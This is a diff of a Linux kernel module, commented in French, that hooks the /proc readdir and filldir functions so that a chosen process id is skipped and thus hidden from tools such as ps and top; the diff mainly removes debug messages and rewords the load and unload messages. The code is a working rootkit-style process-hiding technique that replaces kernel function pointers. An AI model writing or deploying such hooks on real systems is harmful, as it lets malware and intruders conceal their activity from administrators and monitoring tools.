@@ -59,10 +59,7 @@ struct proc_dir_entry * find_proc_entry(void){
   struct proc_dir_entry *pere = NULL;
   char * name = "hideProcess_tmp";
   struct proc_dir_entry *tmp = create_proc_entry(name, 0444, pere_1);
-  printk(KERN_ALERT "[DEBUG] pere_1 = %p\n", pere_1);
   pere =  tmp->parent;
-  printk(KERN_ALERT "[DEBUG] pere = %p\n", pere);
-  printk(KERN_ALERT "[DEBUG] name = %s\n", tmp->name);
   remove_proc_entry(tmp->name, NULL);
   return pere;
 }
@@ -86,7 +83,6 @@ int _atoi(const char *s){
 }
 
 int my_readdir(struct file *fp, void *buf, filldir_t filldir){  
-  printk(KERN_ALERT "[DEBUG] Je suis dans la fonction my_readdir\n");
   /* sauvegarder la ref vers la vraie fonction filldir */
   filldir_old_global = filldir;
   return (*readdir_old_global)(fp, buf, my_filldir);
@@ -94,16 +90,13 @@ int my_readdir(struct file *fp, void *buf, filldir_t filldir){
 
 
 int my_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x){
-  printk(KERN_ALERT "[DEBUG] Je suis dans la fonction my_filldir\n");
   /* si le pid courant est celui du processus qu'on veut cacher */
   if (_atoi(name) == pid){
-    printk(KERN_ALERT "[DEBUG] Je suis dans le if. pid = %d\n",pid);
     /* dans ce cas on retourne 0. */
     /* Tous les outils style top et ps n'afficheront pas */
     /* ce processus car il n'existe pas pour eux */
     return 0;
   }
-  printk(KERN_ALERT "[DEBUG] Je ne suis pas dans le if. _atoi(name) = %d\n",_atoi(name));
   /* sinon on appelle la vraie filldir */
   return (*filldir_old_global)(buf, name, nlen, off, ino, x);
 }
@@ -120,7 +113,7 @@ static int hello_init(void)
   readdir_old_global = proc_fops_global->readdir;
   proc_fops_global->readdir = my_readdir;
   
-  printk(KERN_ALERT "Je suis le module cache\n");
+  printk(KERN_ALERT "Je suis le module qui cache les processus\n");
   return 0;
 }
 
@@ -129,7 +122,7 @@ static void hello_exit(void)
 {
   /* avant de enlever le module, revenir au comportement normal */
   proc_fops_global->readdir = readdir_old_global;
-  printk(KERN_ALERT "Goodbye, cruel world\n");
+  printk(KERN_ALERT "Goodbye, je suis franc, je ne cache plus rien !\n");
 }
 
 module_init(hello_init);
